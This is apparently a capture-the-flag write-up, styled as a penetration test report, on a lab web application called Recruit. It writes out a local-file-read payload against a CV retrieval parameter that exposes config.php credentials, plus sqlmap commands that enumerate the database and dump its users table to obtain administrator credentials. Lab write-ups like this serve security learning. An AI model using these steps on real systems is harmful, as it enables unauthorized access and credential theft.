# Recruit — Penetration Testing Report

## 1. Executive Summary

A penetration test challenge on THM was conducted against the **Recruit** web application hosted at:

`10.113.131.159`

The assessment began with network and web application reconnaissance, followed by endpoint enumeration and manual testing of the exposed functionality.

During the assessment, multiple security weaknesses were identified and chained together to obtain administrative access to the application.

The primary attack path was:

**Local File Read → Credential Disclosure → HR Authentication → SQL Injection → Database Enumeration → Admin Credential Disclosure → Administrator Access**

The most significant findings were:

1. Local File Read through the CV retrieval functionality.
2. Sensitive credential disclosure from `config.php`.
3. SQL Injection in the dashboard search functionality.
4. Extraction of the application's database contents.
5. Disclosure of administrator credentials.
6. Successful authentication to the administrator dashboard.

---

# 2. Scope

### Target

| Item             | Value            |
| ---------------- | ---------------- |
| Target IP        | `10.113.131.159` |
| Protocol         | HTTP             |
| Web Port         | `80/tcp`         |
| Web Server       | Apache 2.4.41    |
| Operating System | Ubuntu Linux     |
| Application      | Recruit          |

Testing was performed against the authorized challenge environment.

---

# 3. Methodology

The assessment followed a progressive penetration-testing methodology:

1. Network Reconnaissance
2. Service Enumeration
3. Web Technology Fingerprinting
4. Directory and Endpoint Enumeration
5. Application Mapping
6. Manual Input Testing
7. Vulnerability Validation
8. Credential Discovery
9. Authentication Testing
10. SQL Injection Testing
11. Database Enumeration
12. Privilege Escalation within the Application
13. Attack-Path Correlation

---

# 4. Reconnaissance

## 4.1 Port and Service Enumeration

Command:

```bash
nmap -sC -sV -p- 10.113.131.159
```

### Results

```text
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
```

Additional information indicated:

```text
OS: Linux
Server: Apache/2.4.41 (Ubuntu)
```

The scan also identified that the `PHPSESSID` cookie did not have the `HttpOnly` flag set.

### Observation

Only TCP port 80 was identified as externally accessible during the scan.

### Screenshot

screenshots/nmp.png

---

# 5. Web Technology Fingerprinting

Command:

```bash
whatweb http://10.113.131.159:80
```

### Identified Technologies

* Apache 2.4.41
* Ubuntu Linux
* Bootstrap
* PHP session management
* HTML5
* Password input
* Recruit web application

### Screenshot

screenshots/whatweb.png

---

# 6. Directory and Endpoint Enumeration

Command:

```bash
gobuster dir \
-u http://10.113.131.159:80 \
-w /usr/share/wordlists/dirb/common.txt \
-x php
```

### Interesting Results

```text
api.php
config.php
dashboard.php
file.php
index.php
mail/
phpmyadmin/
sitemap.xml
```

Several application components were therefore accessible or discoverable.

### Interesting Attack Surface

```text
/api.php
/file.php
/dashboard.php
/config.php
/phpmyadmin/
/mail/
```

### Screenshot

screenshots/gobuster.png

---

# 7. Application Documentation Discovery

The API documentation revealed functionality associated with candidate CV retrieval.

The documented endpoint was:

```text
/file.php?cv=<URL>
```

The documentation indicated that the application processed CVs retrieved from external sources.

This identified `file.php` as a potentially important attack surface.

---

# 8. Local File Read

## Finding: Local File Read

### Description

Testing of the `cv` parameter showed that the application restricted external resources and returned:

```text
Only local files are allowed
```

A local file URI was subsequently tested against an application configuration file:

```text
file:///var/www/html/config.php
```

The application successfully processed the local file and disclosed its contents.

### Impact

The configuration file contained sensitive application credentials.

This converted a seemingly inaccessible configuration file into a source of sensitive information through the application's file-reading functionality.

### Attack Flow

```text
/file.php?cv=
       ↓
Local file restriction identified
       ↓
file:///var/www/html/config.php
       ↓
Local File Read
       ↓
Sensitive configuration data
       ↓
HR credentials
```

### Screenshot

screenshots/email.png
screenshots/SSFR.png

---

# 9. HR Authentication

The discovered HR credentials were tested against the application's authentication mechanism.

Authentication was successful, providing access to the authenticated dashboard.

This demonstrated that the disclosed credentials were valid and usable.

### Impact

The Local File Read vulnerability therefore resulted in direct credential compromise and authenticated application access.

### Screenshot
screenshots/login.png

---

# 10. SQL Injection Discovery

After authenticating as HR, a search functionality was identified within the dashboard.

A single quote was entered into the search field:

```text
'
```

The application returned a SQL-related syntax error.

### Initial Assessment

The error suggested that user-controlled search input was being incorporated into a backend SQL query without appropriate handling.

This generated an SQL Injection hypothesis.

### Screenshot

screenshots/login.png
---

# 11. SQL Injection Validation

The suspected injection point was tested using SQLMap.

```bash
sqlmap \
-u "http://10.113.131.159/dashboard.php?search=test" \
--cookie="PHPSESSID=<REDACTED_SESSION>" \
--dbs \
--batch
```

SQLMap identified:

```text
back-end DBMS: MySQL
```

The application databases were enumerated successfully.

### Discovered Databases

```text
information_schema
mysql
performance_schema
phpmyadmin
recruit_db
sys
```

The application's database was identified as:

```text
recruit_db
```

### Screenshot


screenshots/sql1.png

# 12. Database Enumeration

The tables within `recruit_db` were enumerated using:

```bash
sqlmap \
-u "http://10.113.131.159/dashboard.php?search=test" \
--cookie="PHPSESSID=<REDACTED_SESSION>" \
-D recruit_db \
--tables \
--batch
```

### Results

```text
candidates
users
```

The `users` table was identified as particularly sensitive because it potentially contained authentication information.

### Screenshot

screenshots/sql2.png
---

# 13. Administrator Credential Disclosure

The `users` table was dumped:

```bash
sqlmap \
-u "http://10.113.131.159/dashboard.php?search=test" \
--cookie="PHPSESSID=<REDACTED_SESSION>" \
-D recruit_db \
-T users \
--dump \
--batch
```

The returned record contained an administrator account.

### Result

```text
username: admin
password: <REDACTED>
```

Sensitive credentials should not be published in the public version of this report.

### Impact

The SQL Injection allowed extraction of authentication data from the application's database.

### Screenshot

screenshots/sql3.png
---

# 14. Administrator Access

The disclosed administrator credentials were subsequently used to authenticate to the application.

Administrator access was successfully obtained.

This confirmed the full impact of the SQL Injection.

### Attack Chain

```text
SQL Injection
     ↓
Database Access
     ↓
recruit_db
     ↓
users table
     ↓
Administrator Credentials
     ↓
Administrator Authentication
     ↓
Admin Dashboard
```

### Screenshot

screenshots/admin.png
---

# 15. Complete Attack Chain

The complete attack path identified during the assessment was:

```text
Initial Reconnaissance
        ↓
Web Enumeration
        ↓
API Documentation
        ↓
file.php?cv=
        ↓
Local File Read
        ↓
config.php
        ↓
HR Credentials
        ↓
HR Authentication
        ↓
Dashboard Search
        ↓
SQL Injection
        ↓
MySQL Database
        ↓
recruit_db
        ↓
users
        ↓
Administrator Credentials
        ↓
Administrator Authentication
        ↓
Admin Dashboard
```

This demonstrates how individually exploitable weaknesses can be chained to significantly increase their overall impact.

---

# 16. Findings Summary

| ID   | Finding                             | Severity | Impact                                |
| ---- | ----------------------------------- | -------- | ------------------------------------- |
| F-01 | Local File Read                     | High     | Disclosure of local application files |
| F-02 | Sensitive Credential Disclosure     | High     | Valid HR credentials exposed          |
| F-03 | SQL Injection                       | Critical | Database contents accessible          |
| F-04 | Administrator Credential Disclosure | Critical | Admin credentials exposed             |
| F-05 | Administrative Account Compromise   | Critical | Unauthorized administrative access    |

---

# 17. Security Impact

The vulnerabilities allowed an attacker to progress from an unauthenticated external position to authenticated HR access and ultimately administrator access.

The demonstrated impact included:

* Reading local application files.
* Accessing sensitive configuration data.
* Obtaining valid application credentials.
* Accessing the authenticated dashboard.
* Executing SQL queries through the vulnerable search functionality.
* Enumerating application databases.
* Accessing authentication-related database records.
* Obtaining administrator credentials.
* Accessing the administrator dashboard.

---

# 18. Evidence

The following evidence should accompany the final report:

### Reconnaissance

* Nmap full-port scan
* WhatWeb output
* Gobuster output

### Local File Read

* API documentation
* `file.php` request
* Local file restriction response
* Successful `file://` request
* Redacted configuration disclosure

### Authentication

* HR login
* Authenticated dashboard

### SQL Injection

* Search parameter with `'`
* SQL error
* SQLMap DBMS identification
* Database enumeration
* Table enumeration
* Redacted `users` dump

### Final Impact

* Administrator login
* Administrator dashboard

---

# 19. Conclusion

The assessment demonstrated a complete application-level attack chain against the Recruit application.

The initial exposed functionality allowed local file retrieval, which resulted in disclosure of application credentials. Those credentials provided authenticated access to the dashboard, where a SQL Injection vulnerability allowed database enumeration and extraction of administrator credentials.

The extracted administrator credentials subsequently provided administrative access to the application.

The assessment demonstrates the importance of treating vulnerabilities as interconnected attack paths rather than evaluating each weakness in isolation.
